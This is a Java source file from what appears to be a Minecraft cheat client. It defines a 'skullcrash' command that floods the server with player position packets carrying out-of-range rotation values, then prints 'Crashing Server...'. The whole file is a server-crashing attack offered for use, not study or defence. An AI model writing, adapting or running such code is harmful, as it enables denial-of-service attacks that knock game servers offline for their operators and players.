package me.bratwurst.module.Commands;


import me.bratwurst.manager.Command;
import me.bratwurst.utils.FTools_ItemUtils;
import me.bratwurst.utils.MainUtil;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class skullcrash extends Command {
    public skullcrash() {
        super("skullcrash", "skullcrash", "skullcrash: gib dir ein 260 grad crash kopf");
    }
    @Override
    public void onCommand(String command, String[] args) {
        for (int i = 0; i < 20; ++i) {
           mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ, mc.thePlayer.rotationYaw + 180.0f, mc.thePlayer.rotationPitch + 360.0f, mc.thePlayer.onGround));
        }
        MainUtil.SendClientMesage("Crashing Server...");
    }
}
